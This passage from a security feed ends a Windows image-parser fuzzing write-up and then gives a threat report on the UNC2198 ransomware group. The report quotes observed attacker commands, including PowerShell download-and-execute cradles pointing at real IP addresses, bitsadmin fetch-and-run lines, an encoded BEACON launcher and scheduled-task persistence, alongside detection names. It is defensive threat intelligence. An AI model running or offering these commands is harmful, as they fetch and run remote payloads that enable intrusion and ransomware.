            windowscodecs!CLibTiffDecoderBase::HrProcessCopy+0x4a<br />
            06 000000aa`a654f2f0 00007ff9`44048dbb
            windowscodecs!CLibTiffDecoderBase::HrReadScanline+0x20<br />
            07 000000aa`a654f320 00007ff9`44048b40
            windowscodecs!CDecoderBase::CopyPixels+0x23b<br />  08
            000000aa`a654f3d0 00007ff9`44043c95
            windowscodecs!CLibTiffDecoderBase::CopyPixels+0x80<br />  09
            000000aa`a654f4d0 00007ff9`4404563b
        windowscodecs!CDecoderFrame::CopyPixels+0xb5</span></p> <p>
          <span class="code">0:000&gt; db 00000297`44382140<br />
            00000297`44382140  5b cd 82 55 2a 94 e2 6f-d7 2d a5 93 58 23
            00 6c  [..U*..o.-..X#.l             // <b
              style="font-size: 12.0px;">0x10 bytes from file<br />
            </b>00000297`44382150  06 51 54 18 2e 2a 23 3a-4f ab 14 27
            e9 c6 2c 83  .QT..*#:O..'..,.             // uninitialized
            memory<br />  00000297`44382160  3a 25 b2 f6 9d e7 3c 09-cc
            a5 8e 27 b0 73 41 a9  :%....&lt;....'.sA.<br />
            00000297`44382170  fb 9b 02 b5 81 3e ea 45-4c 0f ab a7 72 e3
            21 e7  .....&gt;.EL...r.!.<br />  00000297`44382180  c8 44
            84 3b c3 b5 44 8a-c9 6e 4b 2e 40 31 38 e0 
            .D.;..D..nK.@18.<br />  00000297`44382190  85 f0 bd 98 3b 0b
            ca b8-78 b1 9d d0 dd 4d 61 66  ....;...x....Maf<br />
            00000297`443821a0  16 7d 0a e2 40 fa f8 45-4f 79 ab 95 d8 54
            f9 44  .}..@..EOy...T.D<br />  00000297`443821b0  66 26 28
            00 b7 96 52 88-15 f0 ed 34 94 5f 6f 94 
        f&amp;(...R....4._o.</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: Partial population of memory</span></p>
 <h4>Use of Uninitialized Memory</h4>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">0:000&gt; r<br />  rax=0000000000000006
            rbx=0000000000000007 rcx=0000000000000200<br />
            rdx=0000000000011803 rsi=0000029744382150
            rdi=0000000000000000<br />  rip=00007ff94414e837
            rsp=000000aaa654f050 rbp=0000000000000001<br />
             r8=0000029744382550  r9=0000000000000000
            r10=0000000000000008<br />  r11=0000000000000013
            r12=00007ff94418b7b0 r13=0000000000000003<br />
            r14=0000000023006c00 r15=00007ff94418bbb0<br />
            iopl=0         nv up ei pl nz na po nc<br />  cs=0033 
            ss=002b  ds=002b  es=002b  fs=0053  gs=002b            
            efl=00000206<br />
            windowscodecs!CCCITT::Expand2DLine+0x253:<br />
            00007ff9`4414e837 0fb606          movzx   eax,byte ptr [rsi]
            ds:00000297`44382150=06             ; <b
              style="font-size: 12.0px;">Uninitialized memory being
        accessed</b></span></p> <p>
          <span class="code"> </span></p> <p>
          <span class="code">0:000&gt; db 00000297`44382140<br />
            00000297`44382140  5b cd 82 55 2a 94 e2 6f-d7 2d a5 93 58 23
            00 6c  [..U*..o.-..X#.l             // <b
              style="font-size: 12.0px;">0x10 bytes from file<br />
            </b>00000297`44382150  06 51 54 18 2e 2a 23 3a-4f ab 14 27
            e9 c6 2c 83  .QT..*#:O..'..,.             // uninitialized
            memory<br />  00000297`44382160  3a 25 b2 f6 9d e7 3c 09-cc
            a5 8e 27 b0 73 41 a9  :%....&lt;....'.sA.<br />
            00000297`44382170  fb 9b 02 b5 81 3e ea 45-4c 0f ab a7 72 e3
            21 e7  .....&gt;.EL...r.!.<br />  00000297`44382180  c8 44
            84 3b c3 b5 44 8a-c9 6e 4b 2e 40 31 38 e0 
            .D.;..D..nK.@18.<br />  00000297`44382190  85 f0 bd 98 3b 0b
            ca b8-78 b1 9d d0 dd 4d 61 66  ....;...x....Maf<br />
            00000297`443821a0  16 7d 0a e2 40 fa f8 45-4f 79 ab 95 d8 54
            f9 44  .}..@..EOy...T.D<br />  00000297`443821b0  66 26 28
            00 b7 96 52 88-15 f0 ed 34 94 5f 6f 94 
        f&amp;(...R....4._o.</span></p> <p>
          <span class="code"> </span></p> <p>
          <span class="code">0:000&gt; k<br />   # Child-SP         
            RetAddr           Call Site<br />  00 000000aa`a654f050
            00007ff9`4414df80
            windowscodecs!CCCITT::Expand2DLine+0x253<br />  01
            000000aa`a654f0d0 00007ff9`4412afcc
            windowscodecs!CCCITT::CCITT_Expand+0xac<br />  02
            000000aa`a654f120 00007ff9`4404d3f0
            windowscodecs!CCITTDecode+0x7c<br />  03 000000aa`a654f170
            00007ff9`4404d2dc
            windowscodecs!TIFFReadEncodedStrip+0xb8<br />  04
            000000aa`a654f1b0 00007ff9`440396dd
            windowscodecs!CLibTiffDecoderBase::ReadStrip+0x74<br />  05
            000000aa`a654f1e0 00007ff9`44115fca
            windowscodecs!CLibTiffDecoderBase::GetOneUnpackedLine+0x1ad<br />
            06 000000aa`a654f2b0 00007ff9`44077400
            windowscodecs!CLibTiffDecoderBase::HrProcessCopy+0x4a<br />
            07 000000aa`a654f2f0 00007ff9`44048dbb
            windowscodecs!CLibTiffDecoderBase::HrReadScanline+0x20<br />
            08 000000aa`a654f320 00007ff9`44048b40
            windowscodecs!CDecoderBase::CopyPixels+0x23b<br />  09
            000000aa`a654f3d0 00007ff9`44043c95
            windowscodecs!CLibTiffDecoderBase::CopyPixels+0x80<br />  0a
            000000aa`a654f4d0 00007ff9`4404563b
        windowscodecs!CDecoderFrame::CopyPixels+0xb5</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: Reading of uninitialized value</span></p>
 <p>Depending on the uninitialized value (Figure 8), different code
  paths are taken in Expand2DLine, which will change the output pixels,
  as shown in Figure 9.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">  {<br />      {<br />          if ( v11 !=
          1 || a2 )<br />          {<br />              unintValue =
          *++allocBuffer | (unintValue &lt;&lt; 8);          // uninit
          mem read<br />          }<br />          else<br />         
          {<br />              unintValue &lt;&lt;= 8;<br />           
            ++allocBuffer;<br />          }<br />          --v11;<br />
                  v16 += 8;<br />        }<br />        v29 = unintValue
          &gt;&gt; (v16 - 8);<br />        dependentUninitValue = *(l +
          2i64 * v29);                           <br />        v16 -=
          *(l + 2i64 * v29 + 1);<br />        if ( dependentUninitValue
          &gt;= 0 )             // path 1<br />          break;<br />   
              if ( dependentUninitValue &lt; '\xC0' )<br />         
          return 0xFFFFFFFFi64;                     // path 2<br />   
          }<br />    if ( dependentUninitValue &lt;= 0x3F )             
          // path xx<br />        break;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: Use of uninitialized memory in <i
    style="font-size: 12.0px;">if</i> conditions</span></p>
 <h4>Patch</h4>
 <p>Microsoft decided to patch this vulnerability by using <span
  class="code">calloc</span> instead of <span
  class="code">malloc</span>, which initializes the allocated memory
  with zeros.</p>
 <h4>Conclusion</h4>
 <p>Part Two of this blog series presents multiple vulnerabilities in
  Windows’ built-in image parsers. In the next post, we will explore
  newer supported image formats in Windows such as RAW, HEIF and more.</p>
http://www.fireeye.com/blog/threat-research/2021/03/fuzzing-image-parsing-in-windows-uninitialized-memory.html2021-03-03T19:30:00.000Z2021-03-03T19:29:58.050ZSo Unchill: Melting UNC2198 ICEDID to Ransomware Operationsnoemail@noemail.orgBryce Abdo<p>Mandiant Advanced Practices (AP) closely tracks the shifting tactics,
  techniques, and procedures (TTPs) of financially motivated groups who
  severely disrupt organizations with ransomware. In May 2020, FireEye
  released a <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html">blog
    post detailing intrusion tradecraft associated with the deployment
    of MAZE</a>. As of publishing this post, we track 11 distinct groups
  that have deployed MAZE ransomware. At the close of 2020, we noticed a
  shift in a subset of these groups that have started to deploy EGREGOR
  ransomware in favor of MAZE ransomware following access acquired from
  ICEDID infections.</p>
 <p>Since its discovery in 2017 as a banking trojan, ICEDID evolved into
  a pernicious point of entry for financially motivated actors to
  conduct intrusion operations. In earlier years, ICEDID was deployed to
  primarily target banking credentials. In 2020 we observed adversaries
  using ICEDID more explicitly as a tool to enable access to impacted
  networks, and in many cases this was leading to the use of common
  post-exploitation frameworks and ultimately the deployment of
  ransomware. This blog post shines a heat lamp on the latest tradecraft
  of UNC2198, who<i> </i>used ICEDID infections to deploy MAZE or
  EGREGOR ransomware.</p>
 <h4>Building an Igloo: ICEDID Infections</h4>
 <p>Separate phases of intrusions are attributed to different
  uncategorized (UNC) groups when discrete operations such as obtaining
  access are not part of a contiguous operation. Pure “access
  operations” establish remote access into a target environment for
  follow on operations actioned by a separate group. A backdoor deployed
  to establish an initial foothold for another group is an example of an
  access operation.</p>
 <p>Between July and December 2020, an ICEDID phishing infection chain
  consisted of a multi-stage process involving MOUSEISLAND and
  PHOTOLOADER (Figure 1).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2198-icedid/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Example UNC2420 MOUSEISLAND to
    ICEDID Infection Chain</span></p>
 <p>MOUSEISLAND is a Microsoft Word macro downloader used as the first
  infection stage and is delivered inside a password-protected zip
  attached to a phishing email (Figure 2). Based on our intrusion data
  from responding to ICEDID related incidents, the secondary payload
  delivered by MOUSEISLAND has been PHOTOLOADER, which acts as an
  intermediary downloader to install ICEDID. Mandiant attributes the
  MOUSEISLAND distribution of PHOTOLOADER and other payloads to <a
  href="https://advantage.mandiant.com/actors/threat-actor--843f8aa0-2305-579a-a08a-f2f88f7815d1">UNC2420</a>,
  a distribution threat cluster created by Mandiant’s Threat Pursuit
  team. UNC2420 activity shares overlaps with the publicly reported
  nomenclature of “<i>Shathak</i>” or “<i>TA551</i>”.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2198-icedid/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: UNC2420 MOUSEISLAND Phishing Email</span></p>
 <h4>Ice, Ice, BEACON...UNC2198</h4>
 <p>Although analysis is always ongoing, at the time of publishing this
  blog post, Mandiant tracks multiple distinct threat clusters (UNC
  groups) of various sizes that have used ICEDID as a foothold to enable
  intrusion operations. The most prominent of these threat clusters is
    <a
  href="https://advantage.mandiant.com/actors/threat-actor--6fd29c05-9c32-578a-83d8-051f89ebf30b">UNC2198</a>,
  a group that has targeted organizations in North America across a
  breadth of industries. In at least five cases, UNC2198 acquired
  initial access from UNC2420 MOUSEISLAND to conduct intrusion
  operations. In 2020, Mandiant attributed nine separate intrusions to
  UNC2198. UNC2198’s objective is to monetize their intrusions by
  compromising victim networks with ransomware.<i> </i>In July 2020,
  Mandiant observed UNC2198 leverage network access provided by an
  ICEDID infection to encrypt an environment with MAZE ransomware. As
  the year progressed into October and November, we observed UNC2198
  shift from deploying MAZE to using EGREGOR ransomware during another
  Incident Response engagement. Like MAZE, EGREGOR is operated using an
    <a
    href="https://advantage.mandiant.com/reports/20-00022696">affiliate
  model</a>, where affiliates who deploy EGREGOR are provided with
  proceeds following successful encryption and extortion for payment.</p>
 <p>The UNC2198 cluster expanded over the course of more than six
  months. Mandiant’s <a
    href="/content/fireeye-www/en_US/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html">December
    2020 blog post on UNCs</a> described the analytical tradecraft we
  use to merge and graduate clusters of activity. Merging UNCs is a
  substantial analytical practice in which indicators and tradecraft
  attributed to one group are scrutinized against another. Two former
  UNCs that shared similar modus operandi were eventually merged into UNC2198.</p>
 <h4>The Snowball Effect of Attribution</h4>
 <p>AP created UNC2198 based on a single intrusion in June 2020
  involving ICEDID, BEACON, SYSTEMBC and WINDARC. UNC2198 compromised 32
  systems in 26 hours during this incident; however, ransomware was not
  deployed. Throughout July 2020 we attributed three intrusions to
  UNC2198 from Incident Response engagements, including one resulting in
  the deployment of MAZE ransomware. In October 2020, a slew of activity
  at both Incident Response engagements and Managed Defense clients
  resulted in the creation of two new UNC groups, and another incident
  attributed to UNC2198.</p>
 <p>One of the new UNC groups created in October 2020 was given the
  designation UNC2374. UNC2374 began as its own distinct cluster where
  BEACON, WINDARC, and SYSTEMBC were observed during an incident at a
  Managed Defense customer. Initial similarities in tooling did not
  constitute a strong enough link to merge UNC2374 with UNC2198 yet.</p>
 <p>Two and a half months following the creation of UNC2374, we amassed
  enough data points to merge UNC2374 into UNC2198. Some of the data
  points used in merging UNC2374 into UNC2198 include:</p>
 <ul> <li>UNC2198 and UNC2374 Cobalt Strike Team Servers used
    self-signed certificates with the following subject on TCP port
  25055:</li> </ul>
 <table border="1" cellspacing="0" cellpadding="0" width="631"> <tbody>
    <tr>
      <td width="631" valign="top"><p>
          <span class="code">C = US, ST = CA, L = California, O = Oracle
            Inc, OU = Virtual Services, CN = oracle.com</span></p> </td> </tr></tbody></table>
 <ul> <li>UNC2198 and UNC2374 deployed WINDARC malware to identical file
      paths: <i
  style="font-size: 12.0px;">%APPDATA%\teamviewers\msi.dll</i></li>
    <li>The same code signing certificate used to sign an UNC2198 BEACON
    loader was used to sign two UNC2374 SYSTEMBC tunneler payloads.</li>
    <li>UNC2374 and UNC2198 BEACON C2 servers were accessed by the same
    victim system within a 10-minute time window during intrusion
  operations.</li> </ul>
 <p>The other UNC group created in October 2020 was given the
  designation UNC2414. Three separate intrusions were attributed to
  UNC2414, and as the cluster grew, we surfaced similarities between
  UNC2414 and UNC2198. A subset of the data points used to merge UNC2414
  into UNC2198 include:</p>
 <ul> <li>UNC2198 and UNC2414 BEACON servers used self-signed
    certificates using the following subject on TCP port 25055:</li> </ul>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">C = US, ST = CA, L = California, O = Oracle
            Inc, OU = Virtual Services, CN = oracle.com</span></p> </td> </tr></tbody></table>
 <ul> <li>UNC2198 and UNC2414 installed BEACON as
  <i>C:\Windows\int32.dll</i></li> <li>UNC2198 and UNC2414 installed the
    RCLONE utility as <i>C:\Perflogs\rclone.exe</i></li> <li>UNC2198 and
    UNC2414 were proven to be financially motivated actors that had
    leveraged ICEDID as initial access:<ul> <li>UNC2198 had deployed
      MAZE</li> <li>UNC2414 had deployed EGREGOR</li> </ul> </li> </ul>
 <p>The merge between UNC2198 and UNC2414 was significant because it
  revealed UNC2198 has access to EGREGOR ransomware. The timing of the
  EGREGOR usage is also consistent with MAZE ransomware shutting down as
    <a
  href="https://advantage.mandiant.com/reports/20-00022696">reported</a>
  by Mandiant Intelligence. Figure 3 depicts the timeline of related
  intrusions and merges into UNC2198.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2198-icedid/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: UNC2198 timeline</span></p>
 <h4>UNC2198 Intrusion Flow: After Initial Access</h4>
 <p>Expanding the UNC2198 cluster through multiple intrusions and merges
  with other UNC groups highlights the range of TTPs employed. We have
  pulled out some key data from all our UNC2198 intrusions to illustrate
  an amalgamation of capabilities used by the threat actor.</p>
 <p>
  <i>Establish Foothold</i></p>
 <p>After obtaining access, UNC2198 has deployed additional malware
  using various techniques. For instance, UNC2198 used <i>InnoSetup
  </i>droppers to install a WINDARC backdoor on the target host. UNC2198
  also used BITS Jobs and remote PowerShell downloads to download
  additional tools like SYSTEMBC for proxy and tunneler capabilities.
  Example commands for download and execution are:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">%COMSPEC% /C echo bitsadmin /transfer 257e
            http://&lt;REDACTED&gt;/&lt;REDACTED&gt;.exe
            %APPDATA%&lt;REDACTED&gt;.exe &amp;
            %APPDATA%&lt;REDACTED&gt;.exe &amp; del %APPDATA%
            &lt;REDACTED&gt;.exe ^&gt;
            %SYSTEMDRIVE%\WINDOWS\Temp\FmpaXUHFennWxPIM.txt &gt;
            \WINDOWS\Temp\MwUgqKjEDjCMDGmC.bat &amp; %COMSPEC% /C start
            %COMSPEC% /C \WINDOWS\Temp\MwUgqKjEDjCMDGmC.bat</span></p> <p>
          <span class="code">%COMSPEC% /C echo powershell.exe -nop -w
            hidden -c (new-object
            System.Net.WebClient).Downloadfile(http://&lt;REDACTED&gt;/&lt;REDACTED&gt;.exe,
            &lt;REDACTED&gt;.exe) ^&gt;
            %SYSTEMDRIVE%\WINDOWS\Temp\AVaNbBXzKyxktAZI.txt &gt;
            \WINDOWS\Temp\yoKjaqTIzJhdDLjD.bat &amp; %COMSPEC% /C start
            %COMSPEC% /C \WINDOWS\Temp\yoKjaqTIzJhdDLjD.bat</span></p>
      </td> </tr></tbody></table>
 <p>UNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER,
  KOADIC, and PowerShell EMPIRE<i style="font-size: 12.0px;">
  </i>offensive security tools<i style="font-size: 12.0px;"> </i>during
  this phase as well.</p>
 <p>
  <i>Offensive Security Tooling</i></p>
 <p>UNC2198 has used offensive security tools similarly seen across many
  threat actors. UNC2198 has used BEACON in roughly 90% of their
  intrusions. UNC2198 installs and executes Cobalt Strike BEACON in a
  variety of ways, including shellcode loaders using PowerShell scripts,
  service executables, and DLLs. While the ways and means of using
  BEACON are not inherently unique, there are still aspects to
  extrapolate that shed light on UNC2198 TTPs.</p>
 <p>Focusing in on specific BEACON executables tells a different story
  beyond the use of the tool itself. Aside from junk code and API calls,
  UNC2198 BEACON and METERPRETER executables often exhibit unique
  characteristics of malware packaging, including odd command-line
  arguments visible within strings and upon execution via child processes:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">cmd.exe /c echo TjsfoRdwOe=9931 &amp; reg
            add HKCU\SOFTWARE\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t
            REG_DWORD /d 3045 &amp; exit</span></p> <p>
          <span class="code">cmd.exe /c echo ucQhymDRSRvq=1236 &amp; reg
            add HKCU\\SOFTWARE\\YkUJvbgwtylk /v KYIaIoYxqwO /t REG_DWORD
            /d 9633 &amp; exit</span></p> <p>
          <span class="code">cmd.exe /c set XlOLqhCejHbSNW=8300 &amp;
            reg add HKCU\SOFTWARE\WaMgGneKhtgTTy /v LbmWADsevLywrkP /t
            REG_DWORD /d 3809 &amp; exit</span></p> </td> </tr></tbody></table>
 <p>These example commands are non-functional, as they do not modify or
  alter payload execution.</p>
 <p>Another technique involves installing BEACON using a file path
  containing mixed Unicode-escaped and ASCII characters to evade detection:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="158" valign="top"><p>
          <b>Unicode Escaped</b></p> </td> <td width="474" valign="top"><p>
          <span
        class="code">C:\ProgramData\S\u0443sH\u0435\u0430ls\T\u0430s\u0441host.exe</span></p>
      </td> </tr>
    <tr>
      <td width="158" valign="top"><p>
          <b>Unicode Unescaped</b></p> </td> <td width="474" valign="top"><p>
          <span
        class="code">C:\ProgramData\SуsHеаls\Tаsсhost.exe</span></p>
      </td> </tr></tbody></table>
 <p>The executable was then executed by using a Scheduled Task named <i>
    <span class="code">shadowdev</span></i>:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">cmd.exe /c schtasks /create /sc minute /mo
            1 /tn shadowdev /tr
        C:\\ProgramData\\S\u0443sH\u0435\u0430ls\\T\u0430s\u0441host.exe</span></p>
      </td> </tr></tbody></table>
 <p>While the previous examples are related to compiled executables,
  UNC2198 has also used simple PowerShell download cradles to execute
  Base64-encoded and compressed BEACON stagers in memory:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">powershell -nop -w hidden -c IEX
            ((new-object
        net.webclient).downloadstring('hxxp://5.149.253[.]199:80/auth'))</span></p> <p>
          <span class="code">powershell.exe -nop -w hidden -c IEX
            ((new-object
        net.webclient).downloadstring(&quot;hxxp://185.106.122[.]167:80/a&quot;))</span></p> <p>
          <span class="code">powershell.exe -nop -w hidden -c &quot;IEX
            ((new-object
        net.webclient).downloadstring('hxxp://195.123.233[.]157:80/casino'))&quot;</span></p>
      </td> </tr></tbody></table>
 <p>
  <i>Discovery and Reconnaissance</i></p>
 <p>UNC2198 has exhibited common TTPs seen across many threat groups
  during discovery and reconnaissance activities. UNC2198 has used the
  BloodHound active directory mapping utility<i> </i>during intrusions
  from within the “<span class="code">C:\ProgramData</span>” and “<span
  class="code">C:\Temp</span>” directories.</p>
 <p>The following are collective examples of various commands executed
  by UNC2198 over time to enumerate a compromised environment:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">arp -a<br />  whoami /groups<br />
            whoami.exe  /groups /fo csv<br />  whoami /all</span></p> <p>
          <span class="code">net user &lt;<i>Redacted</i>&gt;<br />  net
            groups &quot;Domain Admins&quot; /domain<br />  net group
            &quot;Enterprise admins&quot; /domain<br />  net group
            &quot;local admins&quot; /domain<br />  net localgroup
            &quot;administrators&quot; /domain</span></p> <p>
          <span class="code">nltest /domain_trusts<br />  nltest
              /dclist:&lt;<i
        style="font-size: 12.0px;">Redacted</i>&gt;</span></p> </td> </tr></tbody></table>
 <h4>Lateral Movement and Privilege Escalation</h4>
 <p>UNC2198 has used Windows Remote Management and RDP to move laterally
  between systems. UNC2198 has also performed remote execution of BEACON
  service binaries on targeted systems to move laterally. UNC2198
  launches SMB BEACON using PowerShell, executing command lines such as
  the following:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>
          <span class="code">C:\WINDOWS\system32\cmd.exe /b /c start /b
            /min powershell -nop -w hidden -encodedcommand
            JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAB<br />
            bAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AH<br />
        MASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADIALw...&lt;<i>Truncated</i>&gt;</span></p>
      </td> </tr></tbody></table>
 <p>During one intrusion, UNC2198 used the SOURBITS privilege escalation
  utility to execute files on a target system. SOURBITS is a packaged
  exploit utility for <a
  href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0787">CVE-2020-0787</a>,
  which is a vulnerability that was disclosed in 2020 for <i>Windows
    Background Intelligent Transfer Service (BITS)</i>. SOURBITS
  consists of code derived from a <a
    href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION">GitHub
  Repository</a> that is implemented as a command-line utility, which
  can execute arbitrary files with elevated privileges. UNC2198 used
  SOURBITS with the following components:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><span
          class="code">C:\Users\&lt;User&gt;\Downloads\runsysO.cr<br />
      C:\Users\&lt;User&gt;\Downloads\starterO.exe</span></td> </tr></tbody></table>
 <p>The file <i>runsysO.cr</i> is an XOR-encoded PE executable that
  exploits CVE-2020-0787, and based on the target system's bitness, it
  will drop one of two embedded SOURBITS payloads.</p>
 <p>
  <i>Data Theft, Ransomware Deployment and #TTR</i></p>
 <p>Like other financially motivated threat actors, part of UNC2198’s
  modus operandi in latter stages of intrusions involves the
  exfiltration of hundreds of gigabytes of the victim organizations’
  data before ransomware is installed. Specifically, UNC2198 has used
    <i>RCLONE, a </i>command line utility used to synchronize cloud
  storage, to aid in the exfiltration of sensitive data. In all observed
  cases of data theft, <i>RCLONE </i>was used by UNC2198 from the
  “<i>C:\PerfLogs\rclone.exe</i>” file path.</p>
 <p>“<i>Time-to-Ransom</i>&quot; (TTR) is the delta between
  first-attributed <i>access </i>time and the time of ransomware
  deployment. TTR serves as a useful gauge of how quickly an
  organization needs to respond to stave off a threat actor’s successful
  deployment of ransomware. TTR is not a perfect quantification, as
  external factors such as an organization’s security posture can
  drastically affect the measurement.</p>
 <p>In this post, the TTR of UNC2198 is measured between ICEDID activity
  to the deployment of ransomware. In July 2020, UNC2198 deployed MAZE
  ransomware using PSEXEC, and the TTR was 5.5 days. In October 2020,
  UNC2198 deployed EGREGOR ransomware using forced GPO updates, and the
  TTR was 1.5 days.</p>
 <h4>Looking Forward</h4>
 <p>Threat actors leveraging access obtained through mass malware
  campaigns to deploy ransomware is a growing trend. The efficiency of
  ransomware groups places a significant burden on defenders to rapidly
  respond before ransomware deployment. As ransomware groups continue to
  gain operational expertise through successful compromises, they will
  continue to shorten their TTR while scaling their operations.
  Understanding the TTPs fundamental to a specific operation like
  UNC2198 provides an edge to defenders in their response efforts. Our
  unparalleled understanding of groups like UNC2198 is translated into
    <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">Mandiant
  Advantage</a>. Accessing our holdings in Mandiant Advantage aids
  defenders in recognizing TTPs used by threat actors, assessing
  organizational risk, and taking action. Initial investments made into
  rapidly assessing a group’s modus operandi pays dividends when they
  inevitably evolve and swap out components of their toolset. Whether it
  be MAZE or EGREGOR, something icy or hot, Advanced Practices will
  continue to pursue these unchill threat actors.</p>
 <h4>Acknowledgements</h4>
 <p>Thank you to Dan Perez, Andrew Thompson, Nick Richard, Cian Lynch
  and Jeremy Kennelly for technical review of this content. In addition,
  thank you to Mandiant frontline responders for harvesting the valuable
  intrusion data that enables our research.</p>
 <h4>Appendix: Malware Families</h4>
 <p>
  <a
  href="https://advantage.mandiant.com/malware/malware--badb174b-5bbb-51cb-91de-615dd4a54198">PHOTOLOADER</a>
  is a downloader that has been observed to download ICEDID. It makes an
  HTTP request for a fake image file, which is RC4 decrypted to provide
  the final payload. Host information is sent to the command and control
  (C2) via HTTP cookies. Samples have been observed to contain an
  embedded C2 configuration that contain the real C2 with a number of
  non-malicious domains. The non-malicious domains are contacted in
  addition to the real C2.</p>
 <p>
  <a
  href="https://advantage.mandiant.com/malware/malware--5f584191-7903-55f9-8a3d-c1b4528e18be">WINDARC</a>
  is a backdoor that hijacks the execution of TeamViewer to perform C2
  communication. It supports plugins and accepts several backdoor
  commands. The commands include interacting with the TeamViewer tool,
  starting a reverse shell, loading new plugins, downloading and
  executing files, and modifying configuration settings.</p>
 <p>
  <a
  href="https://advantage.mandiant.com/malware/malware--17784955-af55-5462-877f-feaba0c8d80a">SYSTEMBC</a>
  is a proxy malware that beacons to its C2 and opens new proxy
  connections between the C2 and remote hosts as indicated by the C2.
  Proxied communications are encrypted with RC4. The malware receives
  commands via HTTP and creates new proxy connections as directed.
  Underground sales advertisements refer to the software as a “<i>socks5
    backconnect system”</i>. The malware is typically used to hide the
  malicious traffic associated with other malware.</p>
 <h4>Appendix: Detecting the Techniques</h4>
 <p>FireEye security solutions detect these threats across email,
  endpoint, and network levels. The following is a snapshot of existing
  detections related to activity outlined in this blog post.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="138" valign="top"><p>
          <b>Platform</b></p> </td> <td width="486" valign="top"><p>
          <b>Detection Name</b></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>FireEye Network Security</p> </td>
        <td width="486" valign="top"><ul>
          <li>Downloader.Macro.MOUSEISLAND  </li>
          <li>Downloader.Win.PHOTOLOADER     </li>
          <li>Trojan.PHOTOLOADER          </li>
          <li>Downloader.IcedID</li> <li>Trojan.IcedID             </li>
          <li>Malicious.SSL.IcedID</li>
          <li>Malicious.SSL.IcedIdCert</li>
          <li>Trojan.Malicious.Certificate</li> <li>Backdoor.BEACON</li>
          <li>Trojan.Generic</li> <li>Trojan.CobaltStrike</li> </ul>
      </td> </tr>
    <tr>
      <td width="138" valign="top"><p>FireEye Endpoint Security</p>
      </td> <td width="486" valign="top"><p>
          <b>Real-Time (IOC)</b></p> <ul> <li>BLOODHOUND ATTACK PATH
            MAPPING (UTILITY)</li> <li>BLOODHOUND ATTACK PATH MAPPING A
          (UTILITY)</li> <li>COBALT STRIKE (BACKDOOR)</li> <li>COBALT
            STRIKE DEFAULT DLL EXPORT (BACKDOOR)</li> <li>COBALT STRIKE
            NAMED PIPE ECHO (BACKDOOR)</li> <li>EGREGOR RANSOMWARE
          (FAMILY)</li> <li>ICEDID (FAMILY)</li> <li>MAZE RANSOMWARE
          (FAMILY)</li> <li>MAZE RANSOMWARE A (FAMILY)</li>
            <li>METASPLOIT SERVICE ABUSE (UTILITY)</li> <li>MOUSEISLAND
          (DOWNLOADER)</li> <li>MOUSEISLAND A (DOWNLOADER)</li>
            <li>MOUSEISLAND B (DOWNLOADER)</li> <li>POWERSHELL
            DOWNLOADER (METHODOLOGY)</li> <li>POWERSHELL DOWNLOADER D
          (METHODOLOGY)</li> <li>SCHTASK CREATION FROM PROGRAMDATA
          (COLLECTION)</li> <li>SUSPICIOUS BITSADMIN USAGE A
          (METHODOLOGY)</li> <li>SUSPICIOUS POWERSHELL USAGE
          (METHODOLOGY)</li> <li>WMIC SHADOWCOPY DELETE
          (METHODOLOGY)</li> </ul> <p>
          <b>Malware Protection (AV/MG)</b></p> <ul> <li>SYSTEMBC</li>
          <li>Trojan.EmotetU.Gen.*</li> <li>Trojan.Mint.Zamg.O</li>
          <li>Generic.mg.*</li> <li>ICEID</li>
          <li>Gen:Variant.Razy.*</li> <li>Generic.mg.*</li>
          <li>BEACON</li> <li>Gen:Trojan.Heur.TP.TGW@bug909di</li>
          <li>Gen:Variant.Bulz.1217</li>
          <li>Trojan.GenericKD.34797730</li> <li>Generic.mg.*</li> </ul>
      </td> </tr></tbody></table>
 <h4>Appendix: Indicators</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312"
